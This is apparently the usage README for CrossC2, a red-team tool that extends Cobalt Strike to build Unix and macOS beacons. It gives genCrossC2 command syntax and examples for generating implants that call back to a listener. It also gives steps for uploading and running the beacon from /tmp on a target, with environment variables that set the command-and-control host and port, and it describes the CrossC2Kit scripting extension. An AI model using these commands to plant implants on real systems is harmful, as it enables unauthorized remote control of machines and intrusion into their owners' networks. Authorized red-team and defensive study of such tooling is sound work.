# Usage

## 1. Download

Download **CrossC2.cna**, **genCrossC2**, and **CrossC2Kit**. Modify the `CrossC2.cna` configuration.

## 2. Create listener and copy key

* Create a `windows/beacon_https/reverse_https` listener.
* Copy `.cobaltstrike.beacon_keys` from the **teamserver directory** to **local**.

## 3. Function extension

* Add `CrossC2Kit_Loader.cna`, which includes memory loading and other functions.
* The `cs4.x` version file management and process list functions are missing. You must use this Loader to restart them.

## 4. Generate beacon

Use the GUI function provided by cli or cna to generate the beacon by default.

`genCrossC2 <listener-ip/domain> <listener-port> <beacon_keys> <rebind_library;config.ini;c2profile.profile> <target_platform> <target_arch>`
    
Example:

```
1. Read BEACON_KEY from the current path and generate a BEACON with the default C2Profile traffic protocol:
    genCrossC2 127.0.0.1 5555 null null Linux x64 beacon.out
     
2. Specify the BEACON of the custom protocol dynamic library:
    genCrossC2 127.0.0.1 5555 .cobaltstrike.beacon_keys c2profile.so MacOS x64 beacon.out

3. Specify the C2Profile that needs to be automatically parsed:
    genCrossC2 www.example.com 443 .cobaltstrike.beacon_keys ";;c2profile.profile" Linux x64 beacon.out
```

For more advanced configuration, refer to the documentation: [📄Reference](https://github.com/gloxec/CrossC2/wiki/genCrossC2)

## 5. Run beacon

* Run the one-click online script generated by the CrossC2 plugin on the target.
* After uploading the beacon to the target machine, grant it execution permissions.
* Set the working directory for the beacon and run: `export CCPATH=/opt/ && /tmp/c2`
* Temporarily specify the protocol library for the beacon and run: `/tmp/c2 /tmp/c2-rebind.so`
* Temporarily set the C2 configuration for the beacon: `export CCHOST=127.0.0.1 && export CCPORT=443 && /tmp/c2`
* Set DEBUG to view the online status of the beacon: `export CCDEBUG=1 && /tmp/c2`

# CrossC2Kit

CrossC2Kit: https://github.com/CrossC2/CrossC2Kit

CrossC2Kit is an infiltration expansion around the Unix platform derived from CrossC2. It uses the **Aggressor Script** open-source script engine. It can be used to create automation to simulate the operation process of the Red Team and expand the **CobaltStrike** client.

**CrossC2Kit** inherits the original features of **CobaltStrike**, so the development and writing syntax still refer to the official documentation: https://trial.cobaltstrike.com/aggressor-script/index.html

However, it has some API extensions on top of CrossC2 to control the **beacon** of the Unix platform.

API: [📄Reference](https://github.com/CrossC2/CrossC2Kit/wiki/API-Reference)
